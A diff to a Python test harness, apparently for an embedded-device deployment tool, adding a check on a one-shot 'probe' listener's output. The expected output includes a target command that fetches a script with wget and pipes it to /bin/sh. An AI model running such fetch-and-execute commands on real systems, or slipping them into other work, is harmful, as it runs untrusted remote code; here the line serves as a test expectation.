@@ -12053,7 +12053,32 @@ def main(argv=None):
             "server_state": str(probe_release_state),
             "staged_files": str(probe_release_staged),
             "GRIT_OPERATOR_FILE_SERVICE_PORT": free_port(),
+            "GRIT_PROBE_PORT": free_port(),
         }), encoding="utf-8")
+        probe_listener_preview = subprocess.run(
+            [
+                str(server),
+                "--config", str(probe_release_cfg),
+                "--transport", "probe",
+                "--timeout", "0.1",
+                "--one-shot",
+            ],
+            cwd=tmp,
+            text=True,
+            capture_output=True,
+        )
+        probe_listener_text = probe_listener_preview.stdout + probe_listener_preview.stderr
+        probe_port = json.loads(probe_release_cfg.read_text(encoding="utf-8"))["GRIT_PROBE_PORT"]
+        if (probe_listener_preview.returncode != 1 or
+                f"Probe listener. Binding on http://127.0.0.1:{probe_port}/probe.sh" not in probe_listener_text or
+                f"Probe target URL: http://{advertised_operator_host}:{probe_port}/probe.sh" not in probe_listener_text or
+                f"Target command: wget -O- http://{advertised_operator_host}:{probe_port}/probe.sh | /bin/sh" not in probe_listener_text or
+                f"Advertised target endpoint: {advertised_operator_host}:{probe_port}" not in probe_listener_text or
+                f"* {advertised_operator_host}:{probe_port}" not in probe_listener_text or
+                "Traceback" in probe_listener_text):
+            print("probe listener did not clearly separate bind and advertised target endpoints", file=sys.stderr)
+            print(probe_listener_text, file=sys.stderr)
+            return 1
         (probe_release_dir / "scripts").mkdir(parents=True)
         (probe_release_dir / "bin").mkdir(parents=True)
         mipsel_default = probe_release_dir / "by-tuple/mipsel/musl/4.x/mips32r2-24kc/bin/grit-mipsel-default"
